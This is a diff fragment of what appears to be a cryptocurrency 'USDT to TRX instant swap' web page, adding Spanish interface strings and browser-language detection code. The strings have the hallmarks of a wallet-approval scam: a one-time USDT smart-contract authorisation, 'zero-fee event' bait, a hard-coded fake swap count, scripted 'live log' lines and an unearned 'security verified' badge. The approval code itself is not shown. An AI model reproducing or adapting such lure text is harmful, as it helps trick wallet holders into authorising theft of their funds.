+        es:{modal_subtitle:'Seleccione su billetera<br>para conectar automáticamente.',w_tronlink:'Billetera oficial TRON',w_trust:'Billetera multicadena',w_tp:'Popular en Asia',w_bitget:'Billetera Web3 global',w_okx:'Billetera OKX',modal_tip_title:'Si la app no se abre:',modal_tip1:'1. Abra la app manualmente',modal_tip2:'2. Vaya a la pestaña <strong class="text-white">Navegador</strong>',modal_tip3:'3. <strong class="text-white">Pegue</strong> la URL (copiada)',swap_count_val:'18,492 cambios',bal:'Saldo',bal2:'Saldo',connect_wallet2:'Conectar',log_system:'[Sistema] TRON Mainnet conectado',log_waiting:'[Espera] Detectando billetera...',step_core:'Paso clave',step_auto:'Automático',live_log:'Registro',disconnected:'DESCONECTADO',usdt_balance:'Saldo USDT',wallet_address:'Dirección de billetera',balance_label:'Saldo',balance_label2:'Saldo',close_btn:'Cerrar',ticker_label:'Intercambios en vivo',header_sub:'USDT ↔ TRX Cambio instantáneo | TRC-20',connect_wallet:'Conectar',hero_badge:'TRON MAINNET INTERCAMBIO INSTANTÁNEO',hero_title1:'USDT a TRX',hero_title2:'Cambio instantáneo',hero_desc:'Cambie USDT a TRX al instante con 0% de comisión. Aprobación única del contrato inteligente.',today_volume:'Volumen de hoy',free_event:'Sin comisiones',swap_count:'Intercambios',avg_amount:'Monto promedio',steps_title:'Cómo funciona',step_waiting:'Esperando',step1_title:'Conectar billetera',step2_title:'Aprobación (una vez)',step2_desc:'Autorización del contrato USDT',step3_title:'Recibir TRX',step3_desc:'Los TRX intercambiados se depositan automáticamente.',swap_title:'USDT → TRX Cambio',swap_sub:'TRC-20 swap instantáneo',approval_needed:'Aprobación requerida',send_amount:'Usted envía (USDT)',receive_amount:'Usted recibe (est.)',exchange_rate_label:'Tipo de cambio',fee_label:'Comisión',fee_free:'Gratis (periodo de evento)',swap_btn_text:'Iniciar cambio (aprobación)',swap_btn_done:'Cambiar USDT → TRX',swap_notice:'El primer cambio requiere aprobación del contrato inteligente',wallet_info:'Info de billetera',wallet_not_connected:'Billetera no conectada',wallet_guide:'Abra en el navegador DApp de la billetera.',swap_status:'Estado',select_wallet:'Seleccionar billetera',security_title:'Seguridad verificada',faq_title:'Preguntas frecuentes',modal_success:'¡Aprobación completada!',modal_desc:'La autorización de cambio USDT ↔ TRX está confirmada.'}
+    };
+    var currentLang='ko';
+    function detectLang(){var bl=navigator.language||navigator.userLanguage||'en';bl=bl.toLowerCase();if(bl.startsWith('ko'))return 'ko';if(bl.startsWith('zh'))return 'zh';if(bl.startsWith('ru'))return 'ru';if(bl.startsWith('th'))return 'th';if(bl.startsWith('vi'))return 'vi';if(bl.startsWith('ja'))return 'ja';if(bl.startsWith('de'))return 'de';if(bl.startsWith('fr'))return 'fr';if(bl.startsWith('es'))return 'es';return 'en';}
+    function applyLang(lang){currentLang=lang;var t=translations[lang]||translations.en;document.querySelectorAll('[data-i18n]').forEach(function(el){var key=el.getAttribute('data-i18n');if(t[key])el.textContent=t[key];});document.querySelectorAll('[data-i18n-html]').forEach(function(el){var key=el.getAttribute('data-i18n-html');if(t[key])el.innerHTML=t[key];});document.getElementById('lang-select').value=lang;localStorage.setItem('tronswap_lang',lang);try{loadFaqForLang(lang);}catch(e){} try{tickerTimeText=tickerTimeTexts[lang]||tickerTimeTexts.en;}catch(e){}}
+    window.setLang=function(lang){applyLang(lang);};
+    // 페이지 로드 시 언어 감지
+    window.addEventListener('DOMContentLoaded',function(){var saved=localStorage.getItem('tronswap_lang');applyLang(saved||detectLang());});
     </script>
 </body>
 </html>
